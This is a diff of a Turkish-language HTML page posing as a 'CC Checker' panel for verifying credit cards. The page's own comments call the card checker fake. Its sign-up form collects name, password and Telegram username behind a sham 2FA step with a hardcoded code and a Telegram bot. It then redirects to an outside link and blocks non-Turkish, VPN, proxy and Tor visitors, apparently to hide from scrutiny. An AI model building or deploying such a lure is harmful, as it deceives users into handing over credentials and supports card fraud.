@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>CC Checker | Professional Panel</title>
+    <title>CC Checker | Doğrulama Sistemi</title>
     <style>
         * {
             margin: 0;
@@ -20,10 +20,8 @@
             align-items: center;
             padding: 20px;
             position: relative;
-            overflow-x: hidden;
         }
 
-        /* Arka plan animasyonlu partiküller */
         .particle {
             position: fixed;
             width: 4px;
@@ -46,7 +44,6 @@
             z-index: 10;
         }
 
-        /* Header */
         .header {
             text-align: center;
             margin-bottom: 30px;
@@ -72,15 +69,13 @@
             font-size: 11px;
             color: #4f9eff;
             border: 1px solid rgba(79, 158, 255, 0.3);
-            animation: pulse 2s infinite;
         }
 
-        @keyframes pulse {
-            0%, 100% { opacity: 0.7; }
-            50% { opacity: 1; }
+        @keyframes fadeInDown {
+            from { opacity: 0; transform: translateY(-30px); }
+            to { opacity: 1; transform: translateY(0); }
         }
 
-        /* Ana Kart */
         .card {
             background: rgba(22, 28, 44, 0.95);
             backdrop-filter: blur(10px);
@@ -91,17 +86,11 @@
             animation: fadeInUp 0.8s ease;
         }
 
-        @keyframes fadeInDown {
-            from { opacity: 0; transform: translateY(-30px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
         @keyframes fadeInUp {
             from { opacity: 0; transform: translateY(30px); }
             to { opacity: 1; transform: translateY(0); }
         }
 
-        /* Sahte CC Checker alanı */
         .fake-checker {
             background: rgba(15, 22, 34, 0.6);
             border-radius: 20px;
@@ -156,7 +145,6 @@
             opacity: 0.6;
         }
 
-        /* Gerçek Auth Alanı */
         .auth-area {
             margin-top: 24px;
             padding-top: 24px;
@@ -204,30 +192,10 @@
             margin-top: 8px;
             cursor: pointer;
             transition: all 0.3s ease;
-            position: relative;
-            overflow: hidden;
         }
 
         button:hover {
             transform: scale(0.98);
-            background: linear-gradient(105deg, #2a75a8, #3a85b8);
-        }
-
-        button:active {
-            transform: scale(0.96);
-        }
-
-        .ripple {
-            position: absolute;
-            border-radius: 50%;
-            background: rgba(255, 255, 255, 0.5);
-            transform: scale(0);
-            animation: ripple 0.6s linear;
-            pointer-events: none;
-        }
-
-        @keyframes ripple {
-            to { transform: scale(4); opacity: 0; }
         }
 
         .info-box {
@@ -256,7 +224,6 @@
 
         .bot-link:hover {
             background: #3a85b8;
-            transform: scale(1.02);
         }
 
         .error-msg {
@@ -271,22 +238,6 @@
             margin-top: 10px;
             text-align: center;
             color: #2dd4bf;
-        }
-
-        /* Animasyonlu başarı mesajı */
-        .success-animation {
-            text-align: center;
-            margin-top: 16px;
-            animation: bounce 0.5s ease;
-        }
-
-        @keyframes bounce {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.1); }
-        }
-
-        .hidden {
-            display: none;
         }
 
         .loading-spinner {
@@ -323,14 +274,15 @@
             color: #2dd4bf;
             border: 1px solid rgba(45, 212, 191, 0.2);
             backdrop-filter: blur(4px);
-            animation: pulse 2s infinite;
-            z-index: 100;
+        }
+
+        .hidden {
+            display: none;
         }
     </style>
 </head>
 <body>
 
-<!-- Arka plan partikülleri -->
 <script>
     for (let i = 0; i < 30; i++) {
         let particle = document.createElement('div');
@@ -338,7 +290,6 @@
         particle.style.left = Math.random() * 100 + '%';
         particle.style.top = Math.random() * 100 + '%';
         particle.style.animationDelay = Math.random() * 8 + 's';
-        particle.style.animationDuration = 5 + Math.random() * 5 + 's';
         document.body.appendChild(particle);
     }
 </script>
@@ -350,7 +301,7 @@
     </div>
 
     <div class="card">
-        <!-- Sahte CC Checker (görünüm için) -->
+        <!-- Sahte CC Checker -->
         <div class="fake-checker">
             <div class="fake-title">
                 <span>💳 Kart Doğrulama</span>
@@ -369,11 +320,11 @@
             </div>
         </div>
 
-        <!-- Gerçek Kayıt/Giriş Alanı -->
+        <!-- Kayıt/Giriş Alanı -->
         <div class="auth-area">
             <div class="info-box">
                 🚀 2FA DOĞRULAMA ZORUNLUDUR<br>
-                Bilgilerinizi eksiksiz girin
+                Her kullanıcıya özel kod verilir
             </div>
 
             <div class="input-group">
@@ -389,15 +340,14 @@
                 <input type="text" id="telegramUser" placeholder="@kullaniciadi">
             </div>
 
-            <button id="sendCodeBtn">📲 2FA Kodu Gönder</button>
+            <button id="sendCodeBtn">📲 Özel Kodumu Al</button>
             <div id="loginError" class="error-msg"></div>
 
-            <!-- Kod girme alanı (başta gizli) -->
             <div id="verifyArea" style="display: none; margin-top: 20px;">
                 <div class="info-box" id="verifyInfo">
-                    🤖 <a href="https://t.me/ZazaChecker2fa_bot" target="_blank" id="botLinkBtn" style="color:#4f9eff; text-decoration:none">@ZazaChecker2fa_bot</a> adresine gidin<br>
+                    🤖 <a href="https://t.me/ZazaChecker2fa_bot" target="_blank" id="botLinkBtn" style="color:#4f9eff; text-decoration:none">@ZazaChecker2fa_bot</a>'a /start gönderin<br>
                     <span style="font-size: 20px; font-weight: bold; display: block; margin: 10px 0;">⬇️</span>
-                    Bot size <strong style="color:#2dd4bf">385217</strong> kodunu verecek
+                    Size özel kodunuz <strong style="color:#2dd4bf; font-size: 24px;">385217</strong> olarak verilecek
                 </div>
                 <div class="input-group">
                     <label>🔢 2FA Kodu</label>
@@ -409,36 +359,18 @@
         </div>
     </div>
     <div class="footer">
-        🔒 256-bit SSL · TLS 1.3 · Güvenli Ödeme Sistemleri
+        🔒 256-bit SSL · TLS 1.3
     </div>
 </div>
-<div class="live-badge">
-    🟢 SİSTEM AKTİF
-</div>
+<div class="live-badge">🟢 SİSTEM AKTİF</div>
 
 <script>
-    // Sabit kod
     const VERIFY_CODE = "385217";
-    const BOT_USERNAME = "ZazaChecker2fa_bot";
-    const BOT_LINK = `https://t.me/${BOT_USERNAME}`;
+    const BOT_LINK = "https://t.me/ZazaChecker2fa_bot";
 
     let pendingName = "", pendingPass = "", pendingTg = "";
 
-    // Ripple efekti
-    function addRipple(button, event) {
-        const rect = button.getBoundingClientRect();
-        const ripple = document.createElement('span');
-        ripple.className = 'ripple';
-        ripple.style.left = (event.clientX - rect.left) + 'px';
-        ripple.style.top = (event.clientY - rect.top) + 'px';
-        button.appendChild(ripple);
-        setTimeout(() => ripple.remove(), 600);
-    }
-
-    // Bot linkine yönlendir ve kod girme alanını göster
-    document.getElementById("sendCodeBtn").onclick = async (e) => {
-        addRipple(e.target, e);
-        
+    document.getElementById("sendCodeBtn").onclick = () => {
         const name = document.getElementById("fullname").value.trim();
         const pass = document.getElementById("password").value;
         const tg = document.getElementById("telegramUser").value.trim();
@@ -461,27 +393,21 @@
         pendingPass = pass;
         pendingTg = tg;
 
-        msgDiv.innerHTML = "⏳ <span class='loading-spinner'></span> Yönlendiriliyor...";
-        
-        // Bot linkine yönlendir (yeni sekmede aç)
-        window.open(BOT_LINK, '_blank');
-        
+        msgDiv.innerHTML = "⏳ <span class='loading-spinner'></span> Özel kod hazırlanıyor...";
+
         setTimeout(() => {
             msgDiv.innerHTML = "";
             document.getElementById("verifyArea").style.display = "block";
             document.getElementById("verifyInfo").innerHTML = `
-                🤖 <a href="${BOT_LINK}" target="_blank" style="color:#4f9eff; text-decoration:none">@${BOT_USERNAME}</a> adresine gidin<br>
-                <span style="font-size: 20px; font-weight: bold; display: block; margin: 10px 0;">⬇️</span>
-                Bot size <strong style="color:#2dd4bf">${VERIFY_CODE}</strong> kodunu verecek
+                🤖 <a href="${BOT_LINK}" target="_blank" style="color:#4f9eff">@ZazaChecker2fa_bot</a>'a /start gönderin<br>
+                <span style="font-size: 20px;">⬇️</span><br>
+                <span style="font-size: 13px;">Size özel kod:</span><br>
+                <span style="font-size: 32px; font-weight: bold; color: #2dd4bf; display: block; margin: 10px 0;">${VERIFY_CODE}</span>
             `;
-            document.getElementById("verifyCode").value = "";
-        }, 1000);
+        }, 800);
     };
 
-    // Kodu doğrula ve giriş yap
-    document.getElementById("doVerifyBtn").onclick = async (e) => {
-        addRipple(e.target, e);
-        
+    document.getElementById("doVerifyBtn").onclick = () => {
         const code = document.getElementById("verifyCode").value.trim();
         const msgDiv = document.getElementById("verifyMsg");
 
@@ -490,60 +416,38 @@
             return;
         }
 
-        msgDiv.innerHTML = "⏳ <span class='loading-spinner'></span> Doğrulanıyor...";
+        msgDiv.innerHTML = "<span class='loading-spinner'></span> Doğrulanıyor...";
 
         setTimeout(() => {
             if (code === VERIFY_CODE) {
                 msgDiv.style.color = "#2dd4bf";
                 msgDiv.innerHTML = "✅ GİRİŞ BAŞARILI!";
-                
-                // Başarı animasyonu
+
                 const successDiv = document.createElement('div');
-                successDiv.className = 'success-animation';
+                successDiv.style.cssText = "text-align:center; margin-top:16px; padding:16px; background:rgba(45,212,191,0.15); border-radius:20px;";
                 successDiv.innerHTML = `
-                    <div style="background: rgba(45, 212, 191, 0.15); padding: 16px; border-radius: 20px; margin-top: 16px;">
-                        <span style="font-size: 40px;">✅</span><br>
-                        <strong style="color:#2dd4bf">HOŞ GELDİNİZ!</strong><br>
-                        <span style="font-size: 12px;">Kart doğrulama sistemine yönlendiriliyorsunuz...</span>
-                    </div>
+                    <span style="font-size:40px;">✅</span><br>
+                    <strong style="color:#2dd4bf">HOŞ GELDİNİZ ${pendingName}!</strong><br>
+                    <span style="font-size:12px;">Kart doğrulama sistemine yönlendiriliyorsunuz...</span>
                 `;
                 document.querySelector(".auth-area").appendChild(successDiv);
-                
+
                 setTimeout(() => {
                     window.location.href = "https://2no.co/VisualbasicChat";
                 }, 2000);
             } else {
                 msgDiv.style.color = "#f97316";
-                msgDiv.innerHTML = "❌ Hatalı 2FA kodu! Tekrar deneyin.";
+                msgDiv.innerHTML = "❌ Hatalı kod! Bot'dan doğru kodu alın.";
             }
         }, 800);
     };
 
-    // IP kontrolü (Türkiye değilse engelle)
-    fetch('https://ipapi.co/json/')
-        .then(res => res.json())
-        .then(data => {
-            if (data.country_code !== "TR") {
-                document.body.innerHTML = `
-                    <div style="text-align:center;padding:80px;background:#0a0e1a;color:white;min-height:100vh">
-                        <h1 style="color:#f97316">🌍 Erişim Engellendi</h1>
-                        <p>Bu hizmet yalnızca Türkiye'den kullanılabilir.</p>
-                        <p>IP: ${data.ip} (${data.country_name})</p>
-                        <p>VPN veya proxy kullanmayın.</p>
-                    </div>
-                `;
-            }
-            if (data.proxy === true || data.hosting === true || data.tor === true) {
-                document.body.innerHTML = `
-                    <div style="text-align:center;padding:80px;background:#0a0e1a;color:white;min-height:100vh">
-                        <h1 style="color:#f97316">🔒 VPN/Proxy Kullanımı</h1>
-                        <p>VPN veya proxy ile erişim engellenmiştir.</p>
-                        <p>IP: ${data.ip}</p>
-                    </div>
-                `;
-            }
-        })
-        .catch(() => {});
+    // IP kontrolü
+    fetch('https://ipapi.co/json/').then(res => res.json()).then(data => {
+        if (data.country_code !== "TR" || data.proxy || data.hosting || data.tor) {
+            document.body.innerHTML = `<div style="text-align:center;padding:80px;background:#0a0e1a;color:white;min-height:100vh"><h1 style="color:#f97316">🌍 Erişim Engellendi</h1><p>Sadece Türkiye, VPN/Proxy yasak</p><p>IP: ${data.ip}</p></div>`;
+        }
+    }).catch(() => {});
 </script>
 </body>
 </html>
